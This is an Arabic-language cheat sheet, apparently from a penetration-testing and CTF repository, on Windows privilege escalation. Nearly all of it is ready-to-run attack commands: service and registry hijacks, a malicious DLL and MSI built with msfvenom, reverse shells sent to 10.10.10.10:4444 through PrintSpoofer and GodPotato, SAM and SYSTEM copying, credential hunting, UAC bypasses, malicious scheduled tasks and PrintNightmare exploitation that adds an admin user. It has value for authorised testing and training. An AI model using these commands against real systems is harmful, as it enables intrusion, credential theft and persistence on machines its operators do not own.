<a id="-windows-privilege-escalation---complete-cheatsheet"></a>
# 🪟 ورقة مرجعية شاملة لرفع الصلاحيات في Windows

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="رفع الصلاحيات في Windows">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="مرحلة ما بعد الاستغلال">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 دليل شامل لرفع الصلاحيات على أنظمة Windows</b>
</p>

---

يشير الرسم أعلاه إلى رفع الصلاحيات في Windows، وقد حُفظ بتنسيقه الأصلي. رفع الصلاحيات هو الانتقال إلى صلاحيات أعلى عبر ثغرة أو إعداد غير آمن؛ ويمثل SYSTEM حسابًا محليًا ذا صلاحيات واسعة. توضح رموز الوصول (Access Tokens) هوية العملية وامتيازاتها، بينما يشير DLL إلى مكتبة ربط ديناميكي.

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [جمع المعلومات (Enumeration)](#-enumeration)
- [استغلال الخدمات](#-service-exploitation)
- [مسارات الخدمات غير المحاطة بعلامتي اقتباس](#-unquoted-service-paths)
- [اختطاف تحميل مكتبات DLL](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [بيانات الاعتماد المحفوظة](#-stored-credentials)
- [التلاعب برموز الوصول (Tokens)](#-token-manipulation)
- [هجمات Potato](#-potato-attacks)
- [استغلال سجل Windows (Registry)](#-registry-exploits)
- [المهام المجدولة](#-scheduled-tasks)
- [تجاوز التحكم في حساب المستخدم (UAC)](#-uac-bypass)
- [استغلال ثغرات النواة](#-kernel-exploits)
- [مرجع سريع](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 جمع المعلومات (Enumeration)

<a id="system-information"></a>
### معلومات النظام

```cmd
# معلومات النظام
systeminfo
hostname

# إصدار نظام التشغيل
ver
wmic os get caption,version,buildnumber

# معمارية النظام
echo %PROCESSOR_ARCHITECTURE%

# التحديثات والإصلاحات العاجلة
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<a id="user-information"></a>
### معلومات المستخدم

```cmd
# المستخدم الحالي
whoami
whoami /all
whoami /priv
whoami /groups

# جميع المستخدمين
net user
net localgroup administrators

# تفاصيل المستخدم
net user username

# الامتيازات الحالية
whoami /priv
```

<a id="network-information"></a>
### معلومات الشبكة

```cmd
# إعدادات IP
ipconfig /all

# مسارات التوجيه
route print

# المنافذ المفتوحة
netstat -ano
netstat -an | findstr LISTENING

# جدول ARP
arp -a

# ذاكرة DNS المؤقتة
ipconfig /displaydns
```

<a id="process--services"></a>
### العمليات والخدمات

```cmd
# العمليات قيد التشغيل
tasklist
tasklist /svc
wmic process list full

# الخدمات
sc query
net start
wmic service list brief

# برامج التشغيل
driverquery
```

<a id="powershell-enumeration"></a>
### جمع المعلومات باستخدام PowerShell

```powershell
# معلومات النظام
Get-ComputerInfo

# المستخدمون
Get-LocalUser
Get-LocalGroupMember Administrators

# الخدمات
Get-Service

# العمليات
Get-Process

# البرامج المثبّتة
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="-service-exploitation"></a>
## ⚙️ استغلال الخدمات

<a id="find-vulnerable-services"></a>
### العثور على الخدمات القابلة للاستغلال

```cmd
# عرض الخدمات
sc query state= all

# أذونات الخدمات
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# افحص خدمة محدّدة
sc qc servicename
```

<a id="weak-service-permissions"></a>
### أذونات الخدمة الضعيفة

```cmd
# إذا كان بإمكانك تعديل إعدادات الخدمة:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

<a id="weak-service-binary-permissions"></a>
### أذونات ملف الخدمة التنفيذي الضعيفة

```cmd
# افحص أذونات الملف التنفيذي
icacls "C:\Program Files\Service\binary.exe"

# إذا كان قابلًا للكتابة، فاستبدله بملف تنفيذي خبيث
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

<a id="powershell-service-check"></a>
### فحص الخدمات باستخدام PowerShell

```powershell
# احصل على معلومات الخدمة
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# اعثر على خدمات يمكن تعديلها
Get-ModifiableService
```

---

<a id="-unquoted-service-paths"></a>
## 📂 مسارات الخدمات غير المحاطة بعلامتي اقتباس

<a id="find-unquoted-paths"></a>
### العثور على المسارات غير المحاطة بعلامتي اقتباس

```cmd
# اعثر على مسارات خدمات غير محاطة بعلامتي اقتباس
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

<a id="exploit-unquoted-path"></a>
### استغلال مسار غير محاط بعلامتي اقتباس

```
# إذا كان المسار: C:\Program Files\Vulnerable Service\service.exe
# يبحث Windows بالترتيب التالي:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# ضع الملف التنفيذي الخبيث:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# أعد تشغيل الخدمة
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

<a id="-dll-hijacking"></a>
## 📚 اختطاف تحميل مكتبات DLL

<a id="find-missing-dlls"></a>
### العثور على مكتبات DLL المفقودة

```cmd
# استخدم Process Monitor للعثور على مكتبات DLL المفقودة
# عامل التصفية: Result = NAME NOT FOUND، وينتهي Path بالامتداد .dll

# مواقع شائعة تُفحص:
# 1. مجلد التطبيق
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. المجلد الحالي
# 5. المجلدات المدرجة في PATH
```

<a id="create-malicious-dll"></a>
### إنشاء مكتبة DLL خبيثة

```c
// حمولة msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// أو ترجم شيفرة DLL مخصّصة:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

<a id="exploit"></a>
### الاستغلال

```cmd
# انسخ مكتبة DLL إلى مجلد قابل للكتابة ضمن مسار البحث
copy evil.dll "C:\Program Files\App\missing.dll"

# حفّز التطبيق على تحميل مكتبة DLL
# أعد تشغيل الخدمة أو التطبيق
```

---

<a id="-alwaysinstallelevated"></a>
## 📦 AlwaysInstallElevated

<a id="check-for-vulnerability"></a>
### التحقق من وجود الثغرة

```cmd
# يجب ضبط القيمتين على 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<a id="exploit-1"></a>
### الاستغلال

```bash
# أنشئ حزمة MSI خبيثة
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# انقل الملف ونفّذه
msiexec /quiet /qn /i evil.msi
```

---

<a id="-stored-credentials"></a>
## 🔑 بيانات الاعتماد المحفوظة

<a id="credential-manager"></a>
### مدير بيانات الاعتماد (Credential Manager)

```cmd
# اعرض بيانات الاعتماد المحفوظة
cmdkey /list

# استخدم بيانات الاعتماد المحفوظة
runas /savecred /user:Administrator cmd.exe
```

<a id="sam--system"></a>
### SAM & SYSTEM

```cmd
# انسخ ملفات SAM (تحتاج إلى صلاحيات SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# من نُسخ الظل (Shadow Copies)
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

<a id="registry-credentials"></a>
### بيانات الاعتماد في سجل Windows

```cmd
# كلمات مرور تسجيل الدخول التلقائي
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# كلمات مرور VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# جلسات PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

<a id="files-with-passwords"></a>
### ملفات تحتوي على كلمات مرور

```cmd
# ابحث عن كلمات المرور
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# ملفات التثبيت غير المراقب (Unattend)
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# سجل أوامر PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# إعدادات IIS
type C:\inetpub\wwwroot\web.config
```

<a id="wifi-passwords"></a>
### كلمات مرور WiFi

```cmd
# اعرض ملفات تعريف الشبكات
netsh wlan show profiles

# احصل على كلمة المرور
netsh wlan show profile name="SSID" key=clear
```

---

<a id="-token-manipulation"></a>
## 🎭 التلاعب برموز الوصول (Tokens)

<a id="check-privileges"></a>
### فحص الامتيازات

```cmd
whoami /priv

# امتيازات حساسة:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

<a id="seimpersonateprivilege"></a>
### SeImpersonatePrivilege

```cmd
# إذا كان SeImpersonatePrivilege مفعّلًا:
# استخدم هجمات Potato (مثل JuicyPotato وPrintSpoofer وغيرها)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

<a id="sebackupprivilege"></a>
### SeBackupPrivilege

```cmd
# يمكنه قراءة أي ملف
# انسخ SAM وSYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

<a id="serestoreprivilege"></a>
### SeRestorePrivilege

```cmd
# يمكنه الكتابة إلى أي موقع
# استبدل ملفات النظام
```

---

<a id="-potato-attacks"></a>
## 🥔 هجمات Potato

<a id="juicypotato-windows-server-20162019"></a>
### JuicyPotato ‏(Windows Server 2016/2019)

```cmd
# يتطلب SeImpersonatePrivilege أو SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

<a id="printspoofer-windows-10server-2016"></a>
### PrintSpoofer ‏(Windows 10/Server 2016+)

```cmd
# يتطلب SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

<a id="roguepotato"></a>
### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

<a id="godpotato-windows-1011server-2019-2022"></a>
### GodPotato ‏(Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

<a id="-registry-exploits"></a>
## 📝 استغلال سجل Windows (Registry)

<a id="autoruns"></a>
### التشغيل التلقائي (AutoRuns)

```cmd
# افحص مواقع التشغيل التلقائي
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# إذا كان قابلًا للكتابة، فأضف إدخالًا خبيثًا
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

<a id="service-registry-keys"></a>
### مفاتيح الخدمات في سجل Windows

```cmd
# افحص أذونات الخدمات في سجل Windows
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# عدّل قيمة ImagePath الخاصة بالخدمة
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

<a id="-scheduled-tasks"></a>
## ⏰ المهام المجدولة

<a id="list-scheduled-tasks"></a>
### عرض المهام المجدولة

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

<a id="find-writable-task-scripts"></a>
### العثور على سكربتات مهام قابلة للكتابة

```cmd
# إذا كانت المهمة تشغّل سكربتًا يمكنك تعديله:
icacls "C:\Scripts\backup.bat"

# أضف أمرًا خبيثًا
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

<a id="create-malicious-task"></a>
### إنشاء مهمة خبيثة

```cmd
# إذا كان لديك إذن بإنشاء مهام
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="-uac-bypass"></a>
## 🛡️ تجاوز التحكم في حساب المستخدم (UAC)

<a id="check-uac-level"></a>
### فحص مستوى UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

<a id="fodhelper-bypass"></a>
### التجاوز باستخدام Fodhelper

```cmd
# يعمل على Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# إزالة التغييرات
reg delete HKCU\Software\Classes\ms-settings /f
```

<a id="eventviewer-bypass"></a>
### التجاوز باستخدام EventViewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

<a id="-kernel-exploits"></a>
## 💣 استغلال ثغرات النواة

<a id="check-system-info"></a>
### فحص معلومات النظام

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<a id="common-exploits"></a>
### ثغرات شائعة

| CVE | إصدار Windows | الاسم |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | جميع الإصدارات | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | جميع الإصدارات | **PrintNightmare** |

<a id="printnightmare-cve-2021-34527"></a>
### PrintNightmare (CVE-2021-34527)

```cmd
# تحقق من قابلية الاستغلال
Get-Service Spooler

# الاستغلال (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="one-liner-enumeration"></a>
### جمع المعلومات بأوامر من سطر واحد

```cmd
# معلومات سريعة
whoami /all & systeminfo & net user

# افحص الامتيازات
whoami /priv

# الخدمات
wmic service get name,pathname | findstr /i /v "c:\windows"

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

<a id="automated-tools"></a>
### أدوات مؤتمتة

| الأداة | الوصف |
|------|-------------|
| **WinPEAS** | جمع شامل للمعلومات |
| **PowerUp** | رفع الصلاحيات باستخدام PowerShell |
| **Seatbelt** | فحوص أمنية |
| **SharpUp** | فحوص رفع الصلاحيات بلغة C# |

<a id="quick-wins-checklist"></a>
### قائمة التحقق للفرص السريعة

- [ ] `whoami /priv` - افحص SeImpersonate
- [ ] مسارات خدمات غير محاطة بعلامتي اقتباس
- [ ] ملفات تنفيذية للخدمات قابلة للكتابة
- [ ] AlwaysInstallElevated
- [ ] بيانات الاعتماد المحفوظة (cmdkey /list)
- [ ] كلمات مرور تسجيل الدخول التلقائي في سجل Windows
- [ ] أذونات خدمات ضعيفة
- [ ] سكربتات المهام المجدولة
- [ ] إصدار النواة - هل توجد ثغرة PrintNightmare؟

---

<a id="-resources"></a>
## 📚 المراجع

- [LOLBAS](https://lolbas-project.github.io/)
- [دليل HackTricks لرفع الصلاحيات في Windows](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/README.md) — الدليل المحلي المشار إليه في المصدر غير موجود؛ الرابط هنا للتوثيق الرسمي.
- [رفع الصلاحيات في Linux](../../Linux-PrivEsc/translations/README.ar.md)

---



> **التوافق مع الإصدارات:** حُفظت أوامر المصدر كما هي. أداة `wmic` قديمة؛ أُزيلت من Windows 11 24H2 والإصدارات الأحدث وفق تحديث Microsoft في أغسطس 2026. و`Get-WmiObject` من أوامر Windows PowerShell القديمة وليس متاحًا أصليًا في PowerShell 7. قد يشير `sc` في Windows PowerShell إلى `Set-Content` بدل أداة الخدمات؛ يجب تمييزه عن `sc.exe`. كذلك فإن `Get-ModifiableService` دالة من PowerUp وليست أمرًا مدمجًا. راجع [حالة WMIC](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features)، و[اختلافات PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell)، و[الاسم المستعار sc](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-5.1#notes)، و[مصدر PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).
>
> قابلية استغلال خدمة تعتمد على حساب تشغيلها وأذونات تعديلها أو ملفاتها، وعلى القدرة على إعادة تشغيلها؛ وجود مسار غير محاط باقتباس وحده لا يثبت الثغرة. ترتيب بحث DLL المدرج مختصر ويتأثر بنوع التطبيق وKnownDLLs وإعدادات البحث؛ ومثال `DllMain` مقتطف تعليمي، إذ قد يؤدي إنشاء عمليات أثناء حجز loader lock إلى تعليق التطبيق. راجع [أذونات الخدمات](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)، و[ترتيب بحث DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)، و[ممارسات DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices).
>
> أوصاف Potato وأرقام Windows أمثلة تاريخية وليست ضمان توافق. يعتمد PrintSpoofer على خدمة Spooler وامتياز الانتحال، وتوضح [دراسة مؤلفه](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) قيود تقنيات Potato القديمة على الأنظمة الحديثة. تختلف حالة UAC بين مستخدم عادي ومسؤول يملك رمزًا مقيّدًا؛ تجاوز مطالبة المسؤول لا يعني تلقائيًا تحويل مستخدم عادي إلى مسؤول. راجع [آلية UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works).
>
> لا تكفي صلاحية النسخ الاحتياطي وحدها لضمان نجاح نسخ ملفات SAM/SYSTEM النشطة؛ الأمثلة لا تثبت قابلية نسخ ملفات مقفلة. امتيازا `SeBackupPrivilege` و`SeRestorePrivilege` مرتبطان بعمليات النسخ الاحتياطي والاستعادة، وليسا تجاوزًا عامًا لكل قيد على الملفات؛ راجع [تعريف الامتيازات](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) و[قيود مشاركة الملفات](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew). ويجب تحقق قيمة `AlwaysInstallElevated` في نطاقَي المستخدم والجهاز كما في [توثيق السياسة](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated).
>
> جدول «ثغرات النواة» يجمع أنواعًا مختلفة، و`All` في المصدر لا يعني كل إصدار وبنية وتحديث من Windows. مثلًا تصف [نشرة MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) تنفيذ شيفرة عن بُعد في SMBv1؛ ووجود Spooler وحده لا يثبت ثغرة PrintNightmare، ولا يكفي اسم إصدار النظام لتحديد حالة الإصلاح. بعض الكتل الموسومة cmd تتضمن أوامر PowerShell، وعلامات `#` في أمثلة cmd شروح وليست تعليقات أصلية لـ cmd. حُفظت تسميات المصدر وأوامره دون إعادة صياغة.

<p align="center">
  <b>🪟 احصل على صلاحيات SYSTEM!</b><br>
  <i>أتقن رفع الصلاحيات في Windows</i>
</p>
